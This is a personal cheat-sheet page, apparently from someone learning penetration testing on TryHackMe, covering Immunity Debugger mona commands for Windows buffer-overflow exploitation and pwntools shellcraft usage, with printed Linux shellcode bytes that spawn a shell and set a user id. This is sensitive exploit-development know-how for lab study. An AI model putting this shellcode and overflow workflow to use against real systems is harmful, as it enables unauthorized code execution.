---
title: "RTFM"
---

:::info

My version of the "Red Team Field Manual (RTFM)" for attacking boxes, learned from [TryHackMe](https://tryhackme.com/dashboard) and other sources.

:::

## Mona modules

python scripts to use in Immunity Debugger for windows buffer overflows

```bash
# set mona work dir
!mona config -set workingfolder C:\Users\IEUser\Downloads\%p

# create a bytearray to compare for badchar checking (add your badchar list)
!mona bytearray -b "\x00"

# compare memory in crashed app to the bytearray
!mona compare -f C:\Users\IEUser\Downloads\chatserver\bytearray.bin -a 0022F930

# find a jump esp return address (add your badchar list)
!mona jmp -r esp -cpb "\x00"
```

## pwntools

A tool to create various shellcode payloads.

[Installation](https://docs.pwntools.com/en/stable/install.html)

```bash
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

Binary is installed to `~/.local/bin` so add to your `$PATH` e.g. `export PATH=$PATH:~/.local/bin` or edit `~/.bashrc`

Useful commands

```bash
# see available shellcodes
pwn shellcraft -l

# generate shellcode: -f[ormat] d[isasm] <payload>
# format: choose from 
# 'r', 'raw', 's', 'str', 'string', 'c', 'h', 'hex', 'a', 'asm', 'assembly', 
# 'p', 'i', 'hexii', 'e', 'elf', 'd', 'escaped', 'default'
pwn shellcraft -f d i386.linux.sh
\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80

# append shellcodes e.g. if you need a setuid bit run before a .sh
pwn shellcraft -f d amd64.linux.setuid 1000
\x31\xff\x66\xbf\xe8\x03\x6a\x69\x58\x0f\x05

pwn shellcraft -f d amd64.linux.sh
\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05

## add them together:
\x31\xff\x66\xbf\xe8\x03\x6a\x69\x58\x0f\x05\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05
```

Resource: [hacktricks pwn shellcraft](https://book.hacktricks.xyz/exploiting/tools/pwntools#pwn-shellcraft)